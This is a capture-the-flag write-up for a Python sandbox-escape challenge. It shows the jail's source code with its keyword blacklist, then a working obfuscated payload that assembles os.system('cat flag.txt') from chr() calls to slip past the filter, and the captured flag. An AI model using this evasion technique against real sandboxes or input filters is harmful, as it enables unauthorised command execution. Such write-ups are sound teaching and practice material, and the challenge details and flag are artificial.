# PRISON BREAK Cell 2 – 350 pts
Category: PyJail

To connect:
`nc 192.168.8.136 10015`

## Challenge Overview
This challenge is the second level of the “Prison Break” PyJail series. It accepts arbitrary Python input from the user, but implements a more aggressive blacklist than the previous level. The goal is to execute arbitrary shell commands (e.g., cat flag.txt) without triggering any of the blacklisted terms.

```python
jail.py:

#!/usr/local/bin/python

import os
import sys

print("="*40)
print("Welcome to the prison break level 2")
print("="*40)
print("Warden: I found out that you escaped at level 1, and now I will confiscate your tools.")
print("Warden: I will also make sure that you won't be able to escape again. BWAHAHA!!")
print("="*40)
print("---- TIPS from 'ret' who escaped and now he is in lvl 3 ----")
print("I love decorating texts in my house.")
print("------------------------------------------------------------")
hax = input("> ")
sys.stdin.close()

confiscated_tools = ['sys', 'import', 'flag', 'open', '/', "sh", "bin", 'eval', 'exec', 'os', 'read', 'system', 'builtins', '__builtins__']

if len(hax) > 512:
    print("In here your tools was replaced...")
    exit(1)

for tool in confiscated_tools:
    if tool in hax:
        print("In here your tools was replaced...")
        exit(1)

code = f"""
import os

{hax}

""".strip()

os.execv(sys.executable, [sys.executable, "-c", code])
```

## Exploit Strategy
The blacklist filters out substrings like os, system, import, flag, open, /, and others — even if they appear inside strings, list elements, or in concatenation. Literal usage of modules and functions is impossible, so indirect access is necessary.

## Final Working Payload
The breakthrough came from this obfuscated one-liner:

`getattr(globals()[chr(111)+chr(115)], chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))
`
This decodes to:

`getattr(os, "system")("cat flag.txt")`

However, none of the blacklisted substrings appear in the raw payload:

`'os'` is constructed with chr(111)+chr(115)

`'system'` is built from ASCII characters

`'cat flag.txt'` is also constructed dynamically

This bypasses the PyJail’s strict static filtering and successfully executes the shell command to reveal the flag:

`CITU{0k_g00d_y0u_escaped_lvl_2_ret_has_a_message_for_you_in_the_next_level}`
